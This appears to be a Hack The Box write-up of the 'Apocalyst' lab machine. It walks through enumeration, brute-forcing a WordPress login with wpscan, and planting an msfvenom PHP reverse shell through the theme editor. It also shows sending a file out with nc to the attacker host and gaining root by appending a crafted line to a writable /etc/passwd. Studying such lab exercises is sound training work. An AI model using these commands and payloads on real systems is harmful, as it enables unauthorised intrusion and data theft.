![logo](/logo.png)

# [Apocalyst- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 18 Aug 2017 machine on HTB,Apocalyst created by [Dosk3n](https://app.hackthebox.com/users/4987).So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *steghide
  *Wordpress
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/apocalyst 10.10.10.46
```

###### Output 

![](/Linux/Linux-Medium/Apocalyst/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/apocalyst 10.10.10.46                                                                                       ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 19:45 EAT
Nmap scan report for 10.10.10.46
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apocalypse Preparation Blog
|_http-generator: WordPress 4.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.48 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache server`. 

port[22]-ssh
port[80]-  httpd 2.4.18

so when we go the browser at [http://10.10.10.46](http://10.10.10.46) i find a blog web-browser.

![](/Linux/Linux-Medium/Apocalyst/Screenshots/browser.png)

so lets add the `hostname` to `/etc/hosts`

I find nothing od interesting so lets start gobuster so that I can be able to enumerate active directories. 

```sh
gobuster dir -u http://10.10.10.46 -w /usr/share/wordlists/dirb/common.txt -k --no-error
```


![](/Linux/Linux-Medium/Apocalyst/Screenshots/gobuster.png)

i find a bunch of directories  but the sizes seem to be the same as their is nothing significant so i will use `cewl` to make a wordlist from the content of the website.

```sh
cewl 10.10.10.46 > wordlist.txt
```

![](/Linux/Linux-Medium/Apocalyst/Screenshots/cewl.png)

```sh
gobuster dir -u http://10.10.10.46 -w wordlist.txt -k --no-error
```

![](/Linux/Linux-Medium/Apocalyst/Screenshots/rightiousness.png)

lets download the image, however the Rightiousness directory has a larger response size.
Browsing to it reveals only an image

```sh
wget http://10.10.10.46/Rightiousness/image.jpg
```

![](/Linux/Linux-Medium/Apocalyst/Screenshots/download.png)

# Exploitation

running steghide against it with a blank passphrase will output a list.txt file, which is a list of random words of varying languages.

```sh
steghide extract -sf image.jpg
```

![](/Linux/Linux-Medium/Apocalyst/Screenshots/steghide.png)

The list seem to be a wordlist of passwords so lets bruteforce the with the user from the blog 

```sh
wpscan --url http://10.10.10.46 --passwords list.txt --usernames falaraki
```

![](/Linux/Linux-Medium/Apocalyst/Screenshots/foundpasswd.png)

lets use thi credentials to log into the admin once we login 

![](Linux/Linux-Medium/Apocalyst/Screenshots/login.png)

Browse to `Appearance > Editor` on the admin panel, and select the file `Single Post (single.php)`.From here, it is possible to replace the contents of the file with the PHP reverse shell.  So lets create a payload

```sh
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.15 lport=1338 -f
raw > writeup.php
```

![](/Linux/Linux-Medium/Apocalyst/Screenshots/msfvenom.png)

or you can use a `php revershell` from and browing to any post leds to a shell 

![](/Linux/Linux-Medium/Apocalyst/Screenshots/revershshell.png)

![](Linux/Linux-Medium/Apocalyst/Screenshots/shell.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

![](/Linux/Linux-Medium/Apocalyst/Screenshots/stty.png)

we can get the user flag on 

![](/Linux/Linux-Medium/Apocalyst/Screenshots/userflag.png)

so lets run `LinEnum` so that we can get possible `privsec`

![](/Linux/Linux-Medium/Apocalyst/Screenshots/linenum.png)

Running LinEnum on the machine reveals that the `/etc/passwd` file is world-writeable. By adding
a new line to the file, it is possible to create a new user that is part of the root group. However,
switching to this user requires an interactive session.

so let take the `.secret` to our local machine so that we can run strings on it.

```sh
cp .secrete /dev/shm
cd /dev/shm
nc -w 5 10.10.14.15 8003 < .secret 
```

```sh
nc -nvlp 8003 > .secret
```

![](/Linux/Linux-Medium/Apocalyst/Screenshots/bs64.png)

By running `strings` on the file `/home/falaraki/.secret`, a Base64-encoded string. Decoding the string reveals the `password` for the falaraki user.

![](/Linux/Linux-Medium/Apocalyst/Screenshots/decodeing.png)

![](/Linux/Linux-Medium/Apocalyst/Screenshots/falaraki.png)

```sh
writeup:$6$gUo4KFHI$WA8mYODvtKWzjxiwc3Nt6QyBFlhpTAODDCRJb5ORHlpOU1Lc5Rdg
Sb5psFzNkhmgMcPn7eCSrt1izT0a7S2LJ1:0:0:root:/root:/bin/bash
```

![](Linux/Linux-Medium/Apocalyst/Screenshots/etcpasswd.png)

Afterwards, `su writeup` (with the `password writeup`) will grant a root shell.

![](/Linux/Linux-Medium/Apocalyst/Screenshots/rootshell.png)

![](/Linux/Linux-Medium/Apocalyst/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------



